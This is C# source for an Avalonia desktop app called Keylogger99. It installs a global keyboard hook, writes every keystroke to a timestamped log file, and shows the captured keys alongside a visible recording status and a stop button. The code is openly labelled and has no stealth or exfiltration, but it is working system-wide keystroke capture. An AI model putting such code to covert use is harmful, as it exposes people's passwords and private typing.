using Avalonia.Controls;
using Avalonia.Interactivity;
using Avalonia.Threading;
using SharpHook;
using System.Threading.Tasks;

namespace Keylogger99;

public partial class MainWindow : Window
{
    private string _currentLogFile = "log.txt";
    private TaskPoolGlobalHook? _hook;

    public MainWindow()
    {
        InitializeComponent();
        SetupHook();
    }

    private void SetupHook()
    {
        _hook = new TaskPoolGlobalHook();

        string timestamp = System.DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
        _currentLogFile = $"log_{timestamp}.txt";

        System.IO.File.AppendAllText(_currentLogFile, $"--- Session Started: {timestamp} ---\n");

        _hook.KeyPressed += (s, e) =>
        {
            string rawKey = e.Data.KeyCode.ToString().Replace("Vc", "");
        
            // IMPROVED FORMATTING HERE
            string formattedKey = rawKey switch
            {
                "Space" => " ",
                "Enter" => "\n[ENTER]\n",
                "Backspace" => "[BACKSPACE]",
                "Tab" => "\t",
                "LeftShift" or "RightShift" => "", // Ignore shift keys to keep logs clean
                "Delete" => "[DEL]",
                _ => rawKey
            };

            try 
            {
                System.IO.File.AppendAllText(_currentLogFile, formattedKey);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine($"Logging Error: {ex.Message}");
            }

            Dispatcher.UIThread.InvokeAsync(() =>
            {
                // This updates the screen in Keylogger99
                KeyLogDisplay.Text += formattedKey;
                StatusLabel.Text = $"Status: Recording to {_currentLogFile}";
                StatusLabel.Foreground = Avalonia.Media.Brushes.Green;
            });
        };
        
        Task.Run(() => _hook.Run());
    }

    private void OnStopClick(object sender, RoutedEventArgs e)
    {
        if (_hook != null && _hook.IsRunning)
        {
            // 1. Actually stop the hardware listener
            _hook.Dispose(); 
        
            // 2. Change the UI so YOU can see it stopped
            Dispatcher.UIThread.InvokeAsync(() => {
                StatusLabel.Text = "Status: STOPPED (Not Recording)";
                StatusLabel.Foreground = Avalonia.Media.Brushes.Red; // Turns the text red
            });

            // 3. Optional: Add a final line to the log file
            System.IO.File.AppendAllText(_currentLogFile, "\n--- Session Manually Stopped ---\n");
        }
    }

    private void OnClearClick(object sender, RoutedEventArgs e)
    {
        KeyLogDisplay.Text = "";
    }
}